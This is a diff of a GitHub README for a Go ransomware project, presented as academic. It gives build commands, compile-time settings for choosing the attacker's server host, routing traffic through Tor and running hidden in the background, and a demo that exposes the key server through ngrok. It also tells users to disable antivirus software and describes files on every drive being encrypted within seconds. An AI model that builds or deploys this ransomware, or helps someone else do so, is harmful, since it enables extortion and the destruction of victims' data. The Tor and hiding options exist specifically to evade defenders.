@@ -2,58 +2,54 @@
 
 [![Build Status](https://travis-ci.org/mauri870/ransomware.svg?branch=master)](https://travis-ci.org/mauri870/ransomware)
 
-> Note: This project is purely academic, use at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization
+> Note 1: This project is purely academic, use at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization.
 
-**The intent here is to disseminate and teach more about security in the actual world. Remember, security is always a double-edged sword**
+> Note 2: Unfortunatelly now some antiviruses (including Windows Defender) detects the unlocker as a virus. Disable any antivirus to play with the project.
 
-Demo video:
+**Remember, security is always a double-edged sword**
+
+Demo video (Old version, without Tor support):
 
 [![DEMO](https://img.youtube.com/vi/qyyV1dgRgiY/0.jpg)](https://youtu.be/qyyV1dgRgiY)
 
 ### What is Ransomware?
+
 Ransomware is a type of malware that prevents or limits users from accessing their system, either by locking the system's screen or by locking the users' files unless a ransom is paid. More modern ransomware families, collectively categorized as crypto-ransomware, encrypt certain file types on infected systems and forces users to pay the ransom through certain online payment methods to get a decrypt key.
 
 ### Project Summary
-This project aims to build an almost functional crypto-ransomware for educational purposes, written in Go. Basically, it will encrypt your files in background using AES-256-CTR, a strong encryption algorithm, using RSA-4096 to secure the key exchange with server. Yeah, a Cryptolocker like malware.
 
-It is composed of two main parts, the server and the malware itself.
+This project was developed by my for an academic discipline of Computer Security in my degree. Basically, it will encrypt your files in background using AES-256-CTR, a strong encryption algorithm, using RSA-4096 to secure the exchange with the server, optionally using the Tor SOCKS5 Proxy. The base functionality is what you see in the famous ransomware Cryptolocker.
 
-The server is responsible for store the Id and the respective encryption key and possibly act as a Command and Control server in the near future.
+The project is composed by three parts, the server, the malware and the unlocker.
 
-The malware encrypt with your RSA-4096 public key any payload before send then to the server. This approach with the https transport together make the security and authentication almost unbreakable (in theory)
+The server store the victim's identification key along with the encryption key used by the malware.
 
-### Project tasks
+The malware encrypt with a RSA-4096 (RSA-OAEP-4096 + SHA256) public key any payload before send then to the server. This approach with the optional Tor Proxy and a `.onion` domain allow you to hide almost completely your server.
 
-- [x] Run in Background (or not)
-- [x] Encrypt files using AES-256-CTR(Counter Mode) with random IV for each file
-- [x] Without virus signature (at the moment)
-- [x] Use RSA-4096 to secure the authenticity
-- [x] HTTPS and HTTP\2 Transport by default
-- [x] Stream encryption to avoid load an entire file into memory
-- [x] Walk all drives by default, including usb's and network locations
-- [ ] Lock registry entry with hash digest(maybe SHA-256) to identify an infected victim
-- [ ] Tor or other approach to hide the connection with the C&C [see issue 3](https://github.com/mauri870/ransomware/issues/3)
-- [x] Docker image for compilation
+### Features
+
+- Run in Background (or not)
+- Encrypt files using AES-256-CTR(Counter Mode) with random IV for each file.
+- Multithreaded.
+- RSA-4096 to secure the client/server communication.
+- Includes an Unlocker.
+- Optional TOR Proxy support.
+- Use an AES CTR Cypher with stream encryption to avoid load an entire file into memory.
+- Walk all drives by default.
+- Docker image for compilation.
 
 ### Building the binaries
 
-> DON'T RUN ransomware.exe IN YOUR PERSONAL MACHINE, EXECUTE ONLY IN A TEST ENVIRONMENT!
+> DON'T RUN ransomware.exe IN YOUR PERSONAL MACHINE, EXECUTE ONLY IN A TEST ENVIRONMENT! I'm not resposible if you acidentally encrypt all of your disks!
+
+First of all download the project:
 
 ```bash
 go get -v github.com/mauri870/ransomware
 cd $GOPATH/src/github.com/mauri870/ransomware
 ```
 
-#### Docker
-
-```bash
-# You can compile the server for windows using env GOOS=windows make instead of make
-./build-docker.sh make
-```
-
-Done! The binaries live on the bin folder
-
-#### Local
+> If you have Docker skip to the next section.
 
 You need Go at least 1.8 with the `$GOPATH/bin` in your $PATH and `$GOROOT` pointing to your Go installation folder
 
@@ -63,42 +59,103 @@ Build the project require a lot of steps, like the RSA key generation, build thr
 make deps
 make
 ```
-If you like build the server for windows from a unix machine, run `env GOOS=windows make`.
+You can build the server for windows with `make -e GOOS=windows`.
 
-> DON'T RUN ransomware.exe IN YOUR PERSONAL MACHINE, EXECUTE ONLY IN A TEST ENVIRONMENT!
-
-## Usage and How it Works
-
-The malware will run in background. You can see what is going on commenting the HIDDEN line on Makefile before build
-
-By default, the server will listen on `https://localhost:8080`. The client will use this host as the default url too.
-
-You can put the server on any domain and start it. Simply overwrite the `SERVER_HOST` and `SERVER_PORT` on Makefile before build and the malware will try to connect with this url instead
-
-After build, a binary called `ransomware.exe`, `server`/`server.exe` and `unlocker.exe` will be generated on the bin folder. The execution of `ransomware.exe` and `unlocker.exe` (even if it is compiled for linux/darwin) is locked to windows machines only.
-
-Feel free to edit the parameters across the files for testing. The most important parameters are defined in `cmd/common.go` and `Makefile`.
-
-Put the binaries on a correct windows test environment and start the server.
-It will wait for the malware contact and persist the id/encryption keys
-
-When double click on `ransomware.exe` it will run in background by default, walking interesting directories and encrypting all files that match the interesting file extensions using AES-256-CTR and a random IV for each file, recreating then with encrypted content and a custom extension(.encrypted by default) and create a READ_TO_DECRYPT.html and FILES_ENCRYPTED.html files on desktop.
-
-In theory, to decrypt your files you need to send an amount of BTC to the attacker's wallet, followed by a contact sending your ID(located on the file created on desktop). If your payment was confirmed, the attacker possibly(or maybe not) will return your encryption key and the `unlocker.exe` and you can use then to recover your files. This exchange can be accomplished in several ways and WILL NOT be implemented in this project for obvious reasons.
-
-Let's suppose you get your encryption key back, you can retrieve it pointing to the following url:
+#### Docker
 
 ```bash
-curl -k https://localhost:8080/api/keys/:id
+./build-docker.sh make
+```
+
+#### Config Parameters
+
+You can change some of the configs during compilation. Instead of run only `make`, you can use the following variables:
+
+```bash
+HIDDEN='-H windowsgui' # optional. If present the malware will run in background
+
+USE_TOR=true # optional. If present the malware will download the Tor proxy and use it to contact the server
+
+SERVER_HOST=mydomain.com # the domain used to connect to your server. localhost, 0.0.0.0, 127.0.0.1 works too if you run the server on the same machine as the malware
+
+SERVER_PORT=8080 # the server port, if using a domain you can set this to 80
+
+GOOS=linux # the target os to compile the server. Eg: darwin, linux, windows
+```
+
+Example:
+
+`make -e USE_TOR=true SERVER_HOST=mydomain.com SERVER_PORT=80 GOOS=darwin`
+
+The `SERVER_` variables above only apply to the malware. The server has a flag `--port` that you can use to change the port that it will listen on.
+
+> DON'T RUN ransomware.exe IN YOUR PERSONAL MACHINE, EXECUTE ONLY IN A TEST ENVIRONMENT! I'm not resposible if you acidentally encrypt all of your disks!
+
+## Step by Step Demo and How it Works
+
+For this demo I'll use two machines, my personal linux machine and a windows 10 VM.
+
+For the sake of simplicity, I have a folder mapped to the VM, so I can compile from my linux and copy to the vm.
+
+In this demo we will use the [Ngrok](https://ngrok.com) tool, this will allow us to expose our server using a domain, but you can use your own domain or ip address if you want. We are also going to enable the Tor transport, so `.onion` domains will work without problems.
+
+First of all lets start our external domain:
+
+```bash
+ngrok http 8080
+```
+
+This command will give us a url like ` http://2af7161c.ngrok.io`. Keep this command running otherwise the malware won't reach our server.
+
+Let's compile the binaries (remember to replace the domain):
+
+```bash
+make -e SERVER_HOST=2af7161c.ngrok.io SERVER_PORT=80 USE_TOR=true
+```
+
+The `SERVER_PORT` needs to be `80` in this case, since ngrok redirects `2af7161c.ngrok.io:80` to your local server port `8080`.
+
+After build, a binary called `ransomware.exe`, and `unlocker.exe` along with a folder called `server` will be generated in the bin folder. The execution of `ransomware.exe` and `unlocker.exe` (even if you use a diferent GOOS variable during compilation) is locked to windows machines only.
+
+Enter the server directory from another terminal and start it:
+
+```bash
+cd bin/server && ./server --port 8080
+```
+
+To make sure that all is working correctly, make a http request to `http://2af7161c.ngrok.io`:
+
+```bash
+curl http://2af7161c.ngrok.io
+```
+
+If you see a `OK` and some logs in the server output you are ready to go.
+
+Now move the `ransomware.exe` and `unlocker.exe` to the VM along with some dummy files to test the malware. You can take a look at [cmd/common.go](https://github.com/mauri870/ransomware/blob/master/cmd/common.go) to see some configuration options like file extensions to match, directories to scan, skipped folders, max size to match a file among others.
+
+Then simply run the `ransomware.exe` and see the magic happens :smile:.
+
+The window that you see can be hidden using the `HIDDEN` option described in the compilation section.
+
+After download, extract and start the Tor proxy, the malware waits until the tor bootstrapping is done and then proceed with the key exchange with the server. The client/server handshake takes place and the client payload, encrypted with an RSA-4096 public key must be correctly decrypted on the server. The victim identification and encryption keys are stored in a Golang embedded database called BoltDB (it also persists on disk). When completed we get into the find, match and encrypt phase, up to N-cores workers start to encrypt files matched by the patterns defined. This proccess is really quick and in seconds all of your files will be gone.
+
+The encryption key exchanged with the server was used to encrypt all of your files. Each file has a random primitive called [IV](https://en.wikipedia.org/wiki/Initialization_vector), generated individually and saved as the first 16 bytes of the encrypted content. The algorithm used is AES-256-CTR, a good AES cypher with streaming mode of operation such that the file size is left intact.
+
+The only two sources of information available about what just happen are the `READ_TO_DECRYPT.html` and `FILES_ENCRYPTED.html` in the Desktop.
+
+In theory, to decrypt your files you need to send an amount of BTC to the attacker's wallet, followed by a contact sending your ID(located on the file created on desktop). If the attacker can confirm your payment it will possibly(or maybe not) return your encryption key and the `unlocker.exe` and you can use then to recover your files. This exchange can be accomplished in several ways and WILL NOT be implemented in this project for obvious reasons.
+
+Let's suppose you get your encryption key back. To recover the correct key point to the following url:
+
+```bash
+curl -k http://2af7161c.ngrok.io/api/keys/:id
 ```
 
 Where `:id` is your identification stored in the file on desktop. After, run the `unlocker.exe` by double click and follow the instructions.
 
 That's it, got your files back :smile:
 
-## Server endpoints
-
-The server has only two endpoints at the moment
+The server has only two endpoints:
 
 `POST api/keys/add` - Used by the malware to persist new keys. Some verifications are made, like the verification of the RSA autenticity. Returns 204 (empty content) in case of success or a json error.
 
@@ -106,4 +163,4 @@ The server has only two endpoints at the moment
 
 ## The end
 
-As you can see, building a functional ransomware, with some of the best existing algorithms is not dificult, anyone with some programming skills can buit that in any programming language.
+As you can see, building a functional ransomware, with some of the best existing algorithms is not dificult, anyone with some programming skills can build that in any programming language.
